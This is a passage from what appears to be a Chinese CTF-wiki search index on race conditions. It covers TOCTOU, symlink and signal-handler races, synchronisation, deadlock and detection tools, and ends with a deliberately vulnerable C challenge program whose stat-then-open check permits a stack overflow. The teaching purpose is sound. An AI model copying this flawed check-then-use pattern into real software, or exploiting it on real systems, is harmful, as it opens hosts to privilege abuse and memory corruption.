Thread 1736107776 has counter value 6 Thread 1727387392 has counter value 7 Thread 1850304256 has counter value 8 Thread 1709946624 has counter value 9 Thread 1718667008 has counter value 10 \u4f46\u662f\uff0c\u7531\u4e8e\u6761\u4ef6\u7ade\u4e89\u7684\u5b58\u5728\uff0c\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5f80\u5f80\u4e0d\u5c3d\u4eba\u610f \u279c 005 race_condition . / example1 Thread 1417475840 has counter value 2 Thread 1408755456 has counter value 2 Thread 1391314688 has counter value 8 Thread 1356433152 has counter value 8 Thread 1365153536 has counter value 8 Thread 1373873920 has counter value 8 Thread 1382594304 has counter value 8 Thread 1400035072 has counter value 8 Thread 1275066112 has counter value 9 Thread 1266345728 has counter value 10 \u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u6761\u4ef6\u7ade\u4e89\u4e3a\u4ec0\u4e48\u53ef\u80fd\u4f1a\u53d1\u751f\u5462\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u5177\u4f53\u7684\u4f8b\u5b50 \u7a0b\u5e8f\u9996\u5148\u6267\u884c\u4e86action1\uff0c\u7136\u540e\u6267\u884c\u4e86action2\u3002\u5176\u4e2d action \u53ef\u80fd\u662f\u5e94\u7528\u7ea7\u522b\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684\u3002\u6b63\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5728\u6267\u884c action2 \u65f6\uff0caction1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u4ecd\u7136\u662f\u6ee1\u8db3\u7684\u3002 \u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u5e76\u53d1\u6027\uff0c\u653b\u51fb\u8005\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u5728 action2 \u6267\u884c\u4e4b\u524d\u7684\u8fd9\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u7834\u574f action1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u3002\u8fd9\u65f6\u5019\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u4e0e action2 \u4ea7\u751f\u4e86\u6761\u4ef6\u7ade\u4e89\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\u3002 \u6240\u4ee5\u6211\u8ba4\u4e3a\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u7a0b\u5e8f\u5458\u867d\u7136\u5047\u8bbe\u67d0\u4e2a\u6761\u4ef6\u5728\u76f8\u5e94\u65f6\u95f4\u6bb5\u5e94\u8be5\u662f\u6ee1\u8db3\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u6761\u4ef6\u53ef\u80fd\u4f1a\u5728\u8fd9\u4e2a\u5f88\u5c0f\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u88ab\u4fee\u6539\u3002 \u867d\u7136\u8fd9\u4e2a\u65f6\u95f4\u7684\u95f4\u9694\u53ef\u80fd\u975e\u5e38\u5c0f\uff0c\u4f46\u662f\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff08\u5982\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff0cDos\u653b\u51fb\uff09\u4f7f\u5f97\u53d7\u5bb3\u673a\u5668\u7684\u5904\u7406\u901f\u5ea6\u53d8\u5f97\u76f8\u5bf9\u6162\u4e00\u4e9b\u3002","title":"\u6982\u8ff0"},{"location":"pwn/race-condition/introduction/#_2","text":"\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u6709\u4ee5\u4e0b\u5f62\u5f0f\u3002","title":"\u5f62\u5f0f"},{"location":"pwn/race-condition/introduction/#cwe-367-toctou-race-condition","text":"","title":"CWE-367: TOCTOU Race Condition"},{"location":"pwn/race-condition/introduction/#_3","text":"TOCTOC (Time-of-check Time-of-use) \u6307\u7684\u662f\u7a0b\u5e8f\u5728\u4f7f\u7528\u8d44\u6e90\uff08\u53d8\u91cf\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff09\u524d\u4f1a\u5bf9\u8fdb\u884c\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u7a0b\u5e8f\u4f7f\u7528\u5bf9\u5e94\u7684\u8d44\u6e90\u524d\uff0c\u8be5\u8d44\u6e90\u5374\u88ab\u4fee\u6539\u4e86\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u66f4\u52a0\u5177\u4f53\u7684\u4f8b\u5b50\u3002","title":"\u63cf\u8ff0"},{"location":"pwn/race-condition/introduction/#cwe-365-race-condition-in-switch","text":"\u5f53\u7a0b\u5e8f\u6b63\u5728\u6267\u884c switch \u8bed\u53e5\u65f6\uff0c\u5982\u679c switch \u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210\u4e0d\u53ef\u9884\u77e5\u7684\u884c\u4e3a\u3002\u5c24\u5176\u5728case \u8bed\u53e5\u540e\u4e0d\u5199 break \u8bed\u53e5\u7684\u4ee3\u7801\uff0c\u4e00\u65e6 switch \u53d8\u91cf\u53d1\u751f\u6539\u53d8\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u6539\u53d8\u7a0b\u5e8f\u539f\u6709\u7684\u903b\u8f91\u3002","title":"CWE-365: Race Condition in Switch"},{"location":"pwn/race-condition/introduction/#cwe-363-race-condition-enabling-link-following","text":"\u6211\u4eec\u77e5\u9053 Linux \u4e2d\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bf9\u4e8e\u6587\u4ef6\u7684\u547d\u540d\u65b9\u5f0f \u6587\u4ef6\u8def\u5f84\u540d \u6587\u4ef6\u63cf\u8ff0\u7b26 \u4f46\u662f\uff0c\u5c06\u8fd9\u4e24\u79cd\u547d\u540d\u89e3\u6790\u5230\u76f8\u5e94\u5bf9\u8c61\u4e0a\u7684\u65b9\u5f0f\u6709\u6240\u4e0d\u540c \u6587\u4ef6\u8def\u5f84\u540d\u5728\u89e3\u6790\u7684\u65f6\u5019\u662f\u901a\u8fc7\u4f20\u5165\u7684\u8def\u5f84\uff08\u6587\u4ef6\u540d\uff0c\u786c\u94fe\u63a5\uff0c\u8f6f\u8fde\u63a5\uff09 \u95f4\u63a5\u89e3\u6790 \u7684\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u662f\u76f8\u5e94\u6587\u4ef6\u7684\u771f\u5b9e\u5730\u5740(inode)\u3002 \u6587\u4ef6\u63cf\u8ff0\u7b26\u901a\u8fc7\u8bbf\u95ee\u76f4\u63a5\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\u6765\u89e3\u6790\u3002 \u6b63\u662f\u7531\u4e8e\u95f4\u63a5\u6027\uff0c\u4ea7\u751f\u4e86\u4e0a\u9762\u6211\u4eec\u6240\u8bf4\u7684\u65f6\u95f4\u7a97\u53e3\u3002 \u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u7a0b\u5e8f\u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\uff0c\u4e4b\u540e\u4f1a\u6253\u5f00\u6587\u4ef6\u7136\u540e\u6267\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5982\u679c\u5728\u68c0\u67e5\u4e4b\u540e\uff0c\u771f\u6b63\u4f7f\u7528\u6587\u4ef6\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4fee\u6539\u4e3a\u67d0\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u8bbf\u95ee\u9519\u8bef\u7684\u6587\u4ef6\u3002 \u8fd9\u79cd\u6761\u4ef6\u7ade\u4e89\u51fa\u73b0\u7684\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u540d\u5b57\u5bf9\u8c61\u7ed1\u5b9a\u7684\u95ee\u9898\u3002\u800c\u4e0b\u9762\u7684\u51fd\u6570\u90fd\u4f1a\u4f7f\u7528\u6587\u4ef6\u540d\u4f5c\u4e3a\u53c2\u6570\uff1aaccess(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),\u2026 \u90a3\u8be5\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fstat \u51fd\u6570\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u4fe1\u606f\u5e76\u628a\u5b83\u5b58\u5165\u5230stat\u7ed3\u6784\u4f53\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u4fe1\u606f\u4e0e\u6211\u4eec\u5df2\u77e5\u7684\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\u6765\u5224\u65ad\u6211\u4eec\u662f\u5426\u8bfb\u5165\u4e86\u6b63\u786e\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cstat\u7ed3\u6784\u4f53\u4e2d\u7684 st_ino \u548c st_dev \u53d8\u91cf\u53ef\u4ee5\u552f\u4e00\u8868\u793a\u6587\u4ef6 st_ino \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u7684\u5e8f\u5217\u53f7\uff0c\u5373 i-node st_dev \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u5bf9\u5e94\u7684\u8bbe\u5907\u3002","title":"CWE-363: Race Condition Enabling Link Following"},{"location":"pwn/race-condition/introduction/#cwe-364-signal-handler-race-condition","text":"","title":"CWE-364: Signal Handler Race Condition"},{"location":"pwn/race-condition/introduction/#_4","text":"\u6761\u4ef6\u7ade\u4e89\u7ecf\u5e38\u4f1a\u53d1\u751f\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u652f\u6301\u5f02\u6b65\u64cd\u4f5c\u3002\u5c24\u5176\u662f\u5f53\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u662f \u4e0d\u53ef\u91cd\u5165 \u7684\u6216\u8005\u72b6\u6001\u654f\u611f\u7684\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5229\u7528\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\uff0c\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u548c\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u6267\u884c\u4e86free\u64cd\u4f5c\uff0c\u6b64\u65f6\u53c8\u6765\u4e86\u4e00\u4e2a\u4fe1\u53f7\uff0c\u7136\u540e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u5c31\u4f1a\u518d\u6b21\u6267\u884cfree\u64cd\u4f5c\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0 double free \u7684\u60c5\u51b5\uff0c\u518d\u7a0d\u5fae\u64cd\u4f5c\u4e00\u4e0b\uff0c\u5c31\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u4e86\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6709\u5173\u7684\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u60c5\u51b5\u6709 \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u548c\u666e\u901a\u7684\u4ee3\u7801\u6bb5\u5171\u4eab\u5168\u5c40\u53d8\u91cf\u548c\u6570\u636e\u6bb5\u3002 \u5728\u4e0d\u540c\u7684\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u5171\u4eab\u72b6\u6001\u3002 \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4f7f\u7528\u4e0d\u53ef\u91cd\u5165\u7684\u51fd\u6570\uff0c\u6bd4\u5982 malloc \u548c free \u3002 \u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u5904\u7406\u591a\u4e2a\u4fe1\u53f7\uff0c\u8fd9\u53ef\u80fd\u4f1a\u8fdb\u800c\u5bfc\u81f4use after free \u548c double free \u6f0f\u6d1e\u3002 \u4f7f\u7528 setjmp \u6216\u8005 longjmp \u7b49\u673a\u5236\u6765\u4f7f\u5f97\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e0d\u80fd\u591f\u8fd4\u56de\u539f\u6765\u7684\u7a0b\u5e8f\u6267\u884c\u6d41\u3002","title":"\u6982\u8ff0"},{"location":"pwn/race-condition/introduction/#_5","text":"\u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\u7684\u5173\u7cfb\u3002 \u7ebf\u7a0b\u5b89\u5168 \u5373\u8be5\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u8c03\u7528\uff0c\u800c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002 \u6761\u4ef6 \u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5171\u4eab\u8d44\u6e90 \u6709\u5171\u4eab\u8d44\u6e90\uff0c\u9700\u8981\u52a0\u9501\u3002 \u53ef\u91cd\u7528 \u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u5b9e\u4f8b\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u3002 \u53ef\u91cd\u5165\u51fd\u6570\u53ef\u4ee5\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u5176\u5b83\u4ee3\u7801\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u65f6\uff0c\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002\u6240\u4ee5\u53ef\u91cd\u5165\u51fd\u6570\u4e00\u5b9a\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u3002 \u53ef\u91cd\u5165\u5f3a\u8c03\u7684\u662f\u5355\u4e2a\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u91cd\u65b0\u8fdb\u5165\u540c\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u4ecd\u7136\u662f\u5b89\u5168\u7684\u3002 \u4e0d\u6ee1\u8db3\u6761\u4ef6 \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86\u9759\u6001\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u4e0d\u662f\u5e38\u91cf \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86malloc \u6216\u8005 free \u51fd\u6570 \u51fd\u6570\u4f7f\u7528\u4e86\u6807\u51c6 IO \u51fd\u6570\u3002 \u8c03\u7528\u7684\u51fd\u6570\u4e0d\u662f\u53ef\u91cd\u5165\u7684\u3002 \u53ef\u91cd\u5165\u51fd\u6570\u4f7f\u7528\u7684\u6240\u6709\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728 \u8c03\u7528\u6808 \u7684\u5f53\u524d \u51fd\u6570\u6808 \uff08frame\uff09\u4e0a\u3002","title":"\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165"},{"location":"pwn/race-condition/introduction/#_6","text":"\u5982\u679c\u60f3\u8981\u6d88\u9664\u6761\u4ef6\u7ade\u4e89\uff0c\u90a3\u4e48\u9996\u8981\u7684\u76ee\u6807\u662f\u627e\u5230\u7ade\u4e89\u7a97\u53e3\uff08race windows\uff09\u3002 \u6240\u8c13\u7ade\u4e89\u7a97\u53e3\uff0c\u5c31\u662f\u8bbf\u95ee\u7ade\u4e89\u5bf9\u8c61\u7684\u4ee3\u7801\u6bb5\uff0c\u8fd9\u7ed9\u653b\u51fb\u8005\u76f8\u5e94\u7684\u673a\u4f1a\u6765\u4fee\u6539\u76f8\u5e94\u7684\u7ade\u4e89\u5bf9\u8c61\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u51b2\u7a81\u7684\u7ade\u4e89\u7a97\u53e3\u76f8\u4e92\u6392\u65a5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002","title":"\u9632\u8303"},{"location":"pwn/race-condition/introduction/#_7","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u540c\u6b65\u539f\u8bed\u6765\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\u5e38\u89c1\u7684\u5982\u4e0b \u9501\u53d8\u91cf \u901a\u5e38\u4e92\u65a5\u7410\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u653e\u5f03CPU\uff0c\u8fdb\u5165idle\u72b6\u6001\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u81ea\u52a8\u5c1d\u8bd5\u3002 \u81ea\u65cb\u9501\uff08spinlock\uff09\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u4e0d\u653e\u5f03CPU\uff0c\u4e00\u76f4\u5c1d\u8bd5\u3002 \u6761\u4ef6\u53d8\u91cf \u6761\u4ef6\u53d8\u91cf\u662f\u7528\u6765\u7b49\u5f85\u800c\u4e0d\u662f\u7528\u6765\u4e0a\u9501\u7684\u3002\u6761\u4ef6\u53d8\u91cf\u7528\u6765\u81ea\u52a8\u963b\u585e\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u67d0\u7279\u6b8a\u60c5\u51b5\u53d1\u751f\u4e3a\u6b62\u3002\u901a\u5e38\u6761\u4ef6\u53d8\u91cf\u548c\u4e92\u65a5\u9501\u540c\u65f6\u4f7f\u7528\u3002 \u4e34\u754c\u533a\u5bf9\u8c61\uff0cCRITICAL_SECTION \u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff0c\u63a7\u5236\u53ef\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u533a\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u4e00\u822c\u6bd41\u5927\u3002 \u7ba1\u9053\uff0c\u6307\u7528\u4e8e\u8fde\u63a5\u4e00\u4e2a\u8bfb\u8fdb\u7a0b\u548c\u4e00\u4e2a\u5199\u8fdb\u7a0b\u4ee5\u5b9e\u73b0\u5b83\u4eec\u4e4b\u95f4\u901a\u4fe1\u7684\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u3002\u5176\u751f\u5b58\u671f\u4e0d\u8d85\u8fc7\u521b\u5efa\u7ba1\u9053\u7684\u8fdb\u7a0b\u7684\u751f\u5b58\u671f\u3002 \u547d\u540d\u7ba1\u9053\uff0c\u751f\u5b58\u671f\u53ef\u4ee5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u671f\u4e00\u6837\u957f\u3002 # \u521b\u5efa\u7ba1\u9053 mkfifo my_pipe # gzip\u4ece\u7ed9\u5b9a\u7684\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5e76\u628a\u6570\u636e\u538b\u7f29\u5230out.gz\u4e2d gzip -9 -c < my_pipe > out.gz & # \u7ed9\u7ba1\u9053\u4f20\u8f93\u6570\u636e cat file > my_pipe","title":"\u540c\u6b65\u539f\u8bed"},{"location":"pwn/race-condition/introduction/#_8","text":"","title":"\u6b7b\u9501"},{"location":"pwn/race-condition/introduction/#_9","text":"\u5f53\u540c\u6b65\u539f\u8bed\u4f7f\u7528\u7684\u4e0d\u6070\u5f53\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6b7b\u9501\u3002\u5f53\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6267\u884c\u6d41\u4e92\u76f8\u963b\u585e\u5bfc\u81f4\u90fd\u4e0d\u80fd\u7ee7\u7eed\u6267\u884c\uff0c\u6b7b\u9501\u5c31\u4f1a\u53d1\u751f\u3002\u5176\u5b9e\uff0c\u6b7b\u9501\u4e3b\u8981\u662f\u56e0\u4e3a\u5728\u51b2\u7a81\u7684\u6267\u884c\u6d41\u4e2d\uff0c\u51fa\u73b0\u4e86\u5faa\u73af\u7b49\u5f85\u7684\u6267\u884c\u6d41\uff0c\u5373\u5faa\u73af\u7b49\u5f85\u4e2d\u7684\u6bcf\u4e00\u4e2a\u6267\u884c\u6d41\u90fd\u83b7\u5f97\u4e00\u4e2a\u8d44\u6e90\uff0c\u540c\u65f6\u8bd5\u56fe\u83b7\u5f97\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\u4e0b\u56fe\u6240\u793a\uff0cP1\u3001P2 \u4e24\u4e2a\u8fdb\u7a0b\u90fd\u9700\u8981\u8d44\u6e90\u624d\u80fd\u7ee7\u7eed\u8fd0\u884c\u3002P1 \u62e5\u6709\u8d44\u6e90 R2\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R1 \u624d\u80fd\u8fd0\u884c\uff1bP2 \u62e5\u6709\u8d44\u6e90 R1\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R2 \u624d\u80fd\u8fd0\u884c\uff0c\u4e24\u8fb9\u90fd\u5728\u4e92\u76f8\u7b49\u5f85\u800c\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u53ef\u8fd0\u884c\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6b7b\u9501\u6709\u4ee5\u4e0b\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6 \u4e92\u65a5\uff0c\u8d44\u6e90\u662f\u4e92\u65a5\u7684\u3002 \u6301\u6709\u548c\u7b49\u5f85\uff0c\u6301\u6709\u5df2\u6709\u7684\u8d44\u6e90\uff0c\u540c\u65f6\u7b49\u5f85\u4f7f\u7528\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002 \u4e0d\u53ef\u62a2\u5360\uff0c\u8fdb\u7a0b\u6240\u83b7\u5f97\u7684\u8d44\u6e90\u5728\u672a\u4f7f\u7528\u5b8c\u6bd5\u4e4b\u524d\uff0c\u8d44\u6e90\u7533\u8bf7\u8005\u4e0d\u80fd\u5f3a\u884c\u5730\u4ece\u8d44\u6e90\u5360\u6709\u8005\u624b\u4e2d\u593a\u53d6\u8d44\u6e90\uff0c\u800c\u53ea\u80fd\u7531\u8be5\u8d44\u6e90\u7684\u5360\u6709\u8005\u8fdb\u7a0b\u81ea\u884c\u91ca\u653e\u3002 \u5faa\u73af\u7b49\u5f85\uff0c\u5faa\u73af\u7b49\u5f85\u8d44\u6e90\u3002 \u800c\u5982\u679c\u60f3\u8981\u6d88\u9664\u6b7b\u9501\uff0c\u4e5f\u5c31\u662f\u6253\u7834\u4e0a\u9762\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u3002 \u6b64\u5916\uff0c\u6b7b\u9501\u53ef\u80fd\u6765\u6e90\u4e8e\u4ee5\u4e0b\u7684\u539f\u56e0 \u5904\u7406\u5668\u901f\u5ea6 \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u8c03\u5ea6\u7b97\u6cd5\u7684\u53d8\u52a8 \u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5185\u5b58\u7684\u9650\u5236\u3002 \u4efb\u4f55\u80fd\u591f\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u7684\u5f02\u6b65\u4e8b\u4ef6\u3002","title":"\u6982\u8ff0"},{"location":"pwn/race-condition/introduction/#_10","text":"\u6b7b\u9501\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002","title":"\u5f71\u54cd"},{"location":"pwn/race-condition/introduction/#_11","text":"\u90a3\u4e48\uff0c\u8bf4\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u68c0\u6d4b\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u5462\uff1f\u76ee\u524d\u4e5f\u786e\u5b9e\u6709\u8fd9\u65b9\u9762\u7684\u7814\u7a76\uff0c\u4e5f\u662f\u4e3b\u8981\u4ece\u9759\u6001\u5206\u6790\u548c\u52a8\u6001\u5206\u6790\u4e24\u4e2a\u65b9\u9762\u6765\u68c0\u6d4b\u3002","title":"\u68c0\u6d4b"},{"location":"pwn/race-condition/introduction/#_12","text":"\u76ee\u524d\u5df2\u77e5\u7684\u9759\u6001\u68c0\u6d4b\u5de5\u5177\u6709 Flawfinder \u76ee\u6807\uff1aC/C++\u6e90\u7801 \u6b65\u9aa4 \u5efa\u7acb\u6f0f\u6d1e\u6570\u636e\u5e93 \u8fdb\u884c\u7b80\u5355\u7684\u6587\u672c\u6a21\u5f0f\u5339\u914d\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u6570\u636e\u6d41\u6216\u63a7\u5236\u6d41\u5206\u6790 ThreadSanitizer \u76ee\u6807\uff1aC++\u548cGO \u5b9e\u73b0\uff1aLLVM","title":"\u9759\u6001\u68c0\u6d4b"},{"location":"pwn/race-condition/introduction/#_13","text":"Intel Inspector Valgrind","title":"\u52a8\u6001\u68c0\u6d4b"},{"location":"pwn/race-condition/introduction/#_14","text":"http://www.teraits.com/pitagoras/marcio/segapp/05.ppt http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"\u53c2\u8003"},{"location":"pwn/race-condition/problem/","text":"\u9898\u76ee \u00b6 \u6784\u9020\u4f8b\u5b50 \u00b6 \u6e90\u4ee3\u7801 \u00b6 \u6e90\u4ee3\u7801\u5982\u4e0b #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <unistd.h> void showflag () { system ( \"cat flag\" ); } void vuln ( char * file , char * buf ) { int number ; int index = 0 ; int fd = open ( file , O_RDONLY ); if ( fd == - 1 ) { perror ( \"open file failed!!\" ); return ; } while ( 1 ) { number = read ( fd , buf + index , 128 ); if ( number <= 0 ) { break ; } index += number ; } buf [ index + 1 ] = '\\x00' ; } void check ( char * file ) { struct stat tmp ; if ( strcmp ( file , \"flag\" ) == 0 ) { puts ( \"file can not be flag!!\" ); exit ( 0 ); } stat ( file , & tmp ); if ( tmp . st_size > 255 ) { puts ( \"file size is too large!!\" ); exit ( 0 ); } } int main ( int argc , char * argv [ argc ]) { char buf [ 256 ]; if ( argc == 2 ) { check ( argv [ 1 ]); vuln ( argv [ 1 ], buf ); } else { puts ( \"Usage ./prog <filename>\" ); } return 0 ; } \u5206\u6790 \u00b6 \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u662f\u4e0d\u662f \u201cflag\u201d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u9000\u51fa\u3002 \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 255\uff0c\u662f\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u9000\u51fa\u3002 \u5c06\u547d\u4ee4\u884c\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u6587\u4ef6\u5185\u5bb9\u8bfb\u5165\u5230 buf \u4e2d \uff0cbuf \u7684\u5927\u5c0f\u4e3a 256\u3002 \u770b\u4f3c\u6211\u4eec\u68c0\u67e5\u4e86\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u540c\u65f6 buf \u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u6ee1\u8db3\u5bf9\u5e94\u7684\u6700\u5927\u5927\u5c0f\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u95ee\u9898\u3002 